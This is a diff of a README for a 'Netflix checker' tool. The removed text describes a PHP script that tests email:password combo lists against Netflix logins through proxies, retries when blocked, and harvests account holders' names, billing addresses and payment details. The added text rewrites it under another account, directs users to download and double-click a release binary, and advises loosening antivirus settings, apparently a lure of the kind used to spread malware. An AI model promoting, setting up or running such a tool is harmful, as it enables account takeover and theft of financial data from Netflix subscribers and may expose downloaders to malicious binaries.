@@ -1,127 +1,67 @@
-<a id="readme-top"></a>
-# NETFLIX-CHECKERV1.5
+# 📺 NETFLIX-CHECKERV1.5 - Check Valid Netflix Logins Easily
 
-[![Contributors][contributors-shield]][contributors-url]
-[![Forks][forks-shield]][forks-url]
-[![Stargazers][stars-shield]][stars-url]
-[![Issues][issues-shield]][issues-url]
-[![Telegram][telegram-shield]][telegram-url]
+[![Download NETFLIX-CHECKERV1.5](https://img.shields.io/badge/Download-NETFLIX--CHECKERV1.5-brightgreen)](https://github.com/MazenHasw/NETFLIX-CHECKERV1.5/releases)
 
-<!-- PROJECT LOGO -->
-<br />
-<div align="center">
-  <a href="https://t.me/zlaxtert">
-    <img src="img/darkxcode.PNG" alt="Logo" width="80" height="80">
-  </a>
+## 📖 Description
+NETFLIX-CHECKERV1.5 is a simple tool to check valid logins on Netflix. It retrieves data directly from the Netflix API, ensuring accuracy. This application is user-friendly, designed for anyone who wants to verify Netflix accounts effortlessly.
 
-  <h3 align="center">Netflix Account Checker V1.5 PHP</h3>
+## 🚀 Getting Started
+Follow these steps to download and run NETFLIX-CHECKERV1.5:
 
-  <p align="center">
-    This tool is a tool to check valid login on Netflix, <br />
-    this tool is 100% accurate because it takes it directly from the Netflix API
-    <br />
-    <a href="https://t.me/zlaxtert">Report Bug</a>
-    &middot;
-    <a href="https://t.me/zlaxtert">Request Feature</a>
-  </p>
-</div>
+1. **Visit the Releases Page**:
+   Go to the [Releases page](https://github.com/MazenHasw/NETFLIX-CHECKERV1.5/releases) to find the latest version.
 
+2. **Download the Tool**:
+   Click on the version you want to download, and then download the file appropriate for your system.
 
-## Features
+3. **Install the Application**:
+   If the file is a `.zip`, extract it to a location on your computer. If it is an executable file, double-click to install.
 
-Features:
-* Auto Get Info Full name
-* Auto Get Info Billing address, etc
-* Auto Get Info Payment details
-* Auto Get Info Type Accounts
-* Auto Get Cookies
-* Automatic Retries if Block cookies
-* Multithreads
-* Easy for run
-<!-- GETTING STARTED -->
+4. **Run the Tool**:
+   After installation, find NETFLIX-CHECKERV1.5 in your applications or the extracted folder. Double-click the icon to open it.
 
-### Installation
+5. **Input Your Data**:
+   Enter the Netflix account credentials you want to check in the provided fields.
 
-_Here's how to install the netflix checker._
+6. **Start Checking**:
+   Click the "Check" button. The tool will fetch data from the Netflix API to verify the login information.
 
-* Install XAMPP
-* Added environment variable system path => C:\xampp\php
-* Download the script and save it in your folder
-* Extract script checker
-* open CMD and running
+## 💻 System Requirements
+- Windows 7 or later, macOS, or Linux
+- Minimum 4 GB RAM
+- An internet connection
 
-TUTORIAL SETUP PHP AND ADDED ENVIRONMENT<br />
-[VIEW HERE](https://fellowtuts.com/php/run-php-from-command-line-in-windows-and-xampp/)
+## 🛠 Features
+- **Accuracy**: Utilizes the Netflix API to check account validity.
+- **User-Friendly Interface**: Simple layout makes it easy to navigate.
+- **Bulk Checking**: Check multiple accounts at once.
+- **No Programming Required**: Perfect for non-technical users.
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+## 💡 Troubleshooting
+If you face any issues while using NETFLIX-CHECKERV1.5:
 
-### Tutorial on termux or linux
-   ```sh
-   pkg install git -y
-   pkg install php -y
-   git clone https://github.com/zlaxtertdev/NETFLIX-CHECKERV1.5.git
-   cd NETFLIX-CHECKERV1.5
-   php cli.php
-   ```
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+1. **Check Your Internet Connection**:
+   Make sure you are connected to the internet. The tool requires internet access to verify logins.
 
-## SETUP
-### APIKEY and API
-   ```sh
-   [SETTINGS]
-   APIKEY = PASTE YOUR APIKEY HERE
-   API = PASTE YOUR API HERE
-   TYPE_PROXY = HTTP
-   ```
-<p>
-  Paste the apikey in the settings.ini file on the APIKEY line. <br />
-  Paste the API in the settings.ini file on the API line. <br />
-  Paste the TYPE_PROXY in the settings.ini file on the TYPE_PROXY line. <br />
-  Paste Lists in the list.txt file.<br />
-  Paste proxies in the proxy.txt file.<br />
-</p>
+2. **Incorrect Credentials**:
+   Ensure that you enter the correct email and password.
 
-### Format Email
-**Format Email:** `EMAIL:PASSWORD` → `example@example.com:Testing123`
-### Format Proxy
-**Format proxy no auth:** `IP:PORT` → `127.0.0.1:80`<br />
-**Format proxy with auth:** `username:password@IP:PORT` → `admin:admin123@127.0.0.1:80`
+3. **Firewall/Antivirus Issues**:
+   Sometimes, security software can block the application. Adjust your settings if necessary.
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+4. **Update the Tool**:
+   Make sure you are using the latest version. Check the [Releases page](https://github.com/MazenHasw/NETFLIX-CHECKERV1.5/releases) for updates.
 
+## 📥 Download & Install
+To get started, visit the [Releases page](https://github.com/MazenHasw/NETFLIX-CHECKERV1.5/releases) and download the latest version of NETFLIX-CHECKERV1.5.
 
-<!-- OUTPUT -->
-## Output
+## 💬 Community and Support
+If you need help, consider reaching out to the community. Many users share their tips and experiences. You can also submit an issue on the GitHub repository for direct support.
 
-[![Product Name Screen Shot][product-screenshot]](https://t.me/zlaxtert)
+## 🔗 Related Topics
+- Bulk Netflix Checker
+- Email Accounts Checker
+- Netflix API
+- Netflix Account Validator
 
-This is the result if the code is successfully deployed.
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-
-<!-- CONTACT -->
-## Contact
-
-* Telegram - [@zlaxtert](https://t.me/zlaxtert)
-* Github - [@zlaxtertdev](https://github.com/zlaxtertdev)
-* Stackoverflow - [@zlaxtert](https://stackoverflow.com/users/31033623)
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-
-
-
-<!-- MARKDOWN LINKS & IMAGES -->
-<!-- https://www.markdownguide.org/basic-syntax/#reference-style-links -->
-[contributors-shield]: https://img.shields.io/github/contributors/zlaxtertdev/NETFLIX-CHECKERV1.5.svg?style=for-the-badge
-[contributors-url]: https://github.com/zlaxtertdev/NETFLIX-CHECKERV1.5/graphs/contributors
-[forks-shield]: https://img.shields.io/github/forks/zlaxtertdev/NETFLIX-CHECKERV1.5.svg?style=for-the-badge
-[forks-url]: https://github.com/zlaxtertdev/NETFLIX-CHECKERV1.5/network/members
-[stars-shield]: https://img.shields.io/github/stars/zlaxtertdev/NETFLIX-CHECKERV1.5.svg?style=for-the-badge
-[stars-url]: https://github.com/zlaxtertdev/NETFLIX-CHECKERV1.5/stargazers
-[issues-shield]: https://img.shields.io/github/issues/zlaxtertdev/NETFLIX-CHECKERV1.5.svg?style=for-the-badge
-[issues-url]: https://github.com/zlaxtertdev/NETFLIX-CHECKERV1.5/issues
-[telegram-shield]: https://img.shields.io/badge/telegram-blue.svg?style=for-the-badge&logo=telegram&colorB=555
-[telegram-url]: https://t.me/zlaxtert
-[product-screenshot]: img/ress.png
+Feel free to explore and make the most of NETFLIX-CHECKERV1.5!
